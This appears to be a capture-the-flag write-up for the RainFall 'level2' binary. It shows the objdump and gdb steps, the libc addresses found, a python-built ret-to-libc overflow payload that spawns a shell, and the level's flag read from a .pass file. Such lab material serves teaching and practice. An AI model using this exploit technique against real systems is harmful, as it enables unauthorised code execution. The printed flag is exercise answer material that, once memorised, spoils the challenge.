# level2

## disassemble

```shell
objdump -dC -M intel level2
```

## ret to libc

### return address

```shell
level2@RainFall:~$ objdump -dC -M intel level2
0804853f <main>:
 804853f:       55                      push   ebp
 8048540:       89 e5                   mov    ebp,esp
 8048542:       83 e4 f0                and    esp,0xfffffff0
 8048545:       e8 8a ff ff ff          call   80484d4 <p>
 804854a:       c9                      leave
 804854b:       c3                      ret
```

```
system("/bin/sh") : ret                 + system + "...." + "/bin/sh"
                    "0x804854b"         + ...
                    "\x4b\x85\x04\x08"  + ...
```

### system address

```shell
gdb level2
(gdb) break main
(gdb) run
(gdb) print system
$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
```

```
system("/bin/sh") : ret                 + system              + "...." + "/bin/sh"
                    "0x804854b"         + "0xb7e6b060"        + "...." + ...
                    "\x4b\x85\x04\x08"  + "\x60\xb0\xe6\xb7"  + "...." + ...
```

### "/bin/sh" address

```shell
(gdb) info proc map
process 3420
Mapped address spaces:
        Start Addr  End Addr    Size      Offset  objfile
        0xb7e2c000  0xb7fcf000  0x1a3000  0x0     /lib/i386-linux-gnu/libc-2.15.so

find 0xb7e2c000, 0xb7fcf000, "/bin/sh"
  0xb7f8cc58
  1 pattern found.
```

```
system("/bin/sh") : ret                 + system              + "...." + "/bin/sh"
                    "0x804854b"         + "0xb7e6b060"        + "...." + "0xb7f8cc58"
                    "\x4b\x85\x04\x08"  + "\x60\xb0\xe6\xb7"  + "...." + "\x58\xcc\xf8\xb7"
```

## exploit

```shell
python2.7 -c 'print("X"*80 + "\x4b\x85\x04\x08"  + "\x60\xb0\xe6\xb7"  + "...." + "\x58\xcc\xf8\xb7")' > /tmp/exploit.txt
cat /tmp/exploit.txt - | ./level2
```

## flag

```shell
cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```
